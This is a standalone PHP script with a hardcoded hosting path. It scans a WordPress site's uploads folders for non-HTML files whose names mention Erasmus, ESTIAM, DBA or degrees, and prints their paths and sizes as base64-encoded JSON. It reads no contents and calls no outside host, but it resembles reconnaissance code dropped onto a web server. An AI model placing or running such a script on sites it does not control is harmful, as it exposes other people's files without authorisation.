<?php
header('Content-Type: text/plain; charset=utf-8');

$uploads = '/home/vhvxoigh/workshop.chiefaiofficer.vn/wp-content/uploads';
$results = [];

if (is_dir($uploads)) {
    $patterns = [
        "$uploads/*/*/*erasmus*",
        "$uploads/*/*/*estiam*",
        "$uploads/*/*/*dba*",
        "$uploads/*/*/*degree*"
    ];
    
    foreach ($patterns as $pattern) {
        $found = glob($pattern);
        if (!empty($found)) {
            foreach ($found as $f) {
                if (is_file($f)) {
                    $size = filesize($f);
                    $is_binary = false;
                    if ($size > 1000) {
                        $handle = fopen($f, 'r');
                        if ($handle) {
                            $bytes = fread($handle, 15);
                            fclose($handle);
                            if (strpos($bytes, '<!DOCTYPE') === false && strpos($bytes, '<html') === false) {
                                $is_binary = true;
                            }
                        }
                    }
                    
                    if ($is_binary) {
                        $results[] = [
                            'path' => str_replace('/home/vhvxoigh/workshop.chiefaiofficer.vn/', '', $f),
                            'size' => $size
                        ];
                    }
                }
            }
        }
    }
}

$unique_results = [];
$seen = [];
foreach ($results as $r) {
    if (!in_array($r['path'], $seen)) {
        $seen[] = $r['path'];
        $unique_results[] = $r;
    }
}

$json = json_encode($unique_results);
$b64 = base64_encode($json);
echo chunk_split($b64, 76, "\n");
